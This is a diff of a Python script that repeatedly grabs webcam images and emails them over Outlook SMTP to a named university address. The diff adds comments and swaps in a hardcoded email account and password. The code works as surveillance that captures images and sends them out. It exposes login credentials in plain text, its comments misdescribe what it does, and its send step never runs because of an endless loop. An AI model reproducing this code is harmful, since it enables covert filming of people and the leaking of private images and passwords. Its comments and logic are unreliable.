@@ -4,11 +4,14 @@ import smtplib
 import time
 from random import *
 
+#Declares a variable to the webcam
 capture = cv2.VideoCapture(0)
 
 while True:
+    #Captures the screen through the webcam and saves it 
     ret, frame = capture.read()
     cv2.imwrite(filename='webcam_image.jpg', img=frame)
+    #Opens the webcam as a NumPy array and then converts it to base64
     screen = open('webcam_image.jpg', 'rb')
     image = MIMEImage(screen.read())
     screen.close()
@@ -16,8 +19,8 @@ while True:
 
 smtp_server = 'smtp-mail.outlook.com'
 smtp_port = 587
-smtp_acct = 'cyber_kid220@outlook.com'
-smtp_password = '$CybKidZ2022'
+smtp_acct = 'william.bratten@outlook.com'
+smtp_password = 'Will22Soccer*'
 tgt_accts = ['p.bratten1@andersonuniversity.edu']
 
 
@@ -33,12 +36,13 @@ def plain_email(subject, contents):
     time.sleep(1)
     server.quit()
 
-
+#Sends the email
 plain_email('Test message', image)
 
 
 capture.release()
 cv2.destroyAllWindows()
+
 
 upper_points = 0
 lower_points = 0
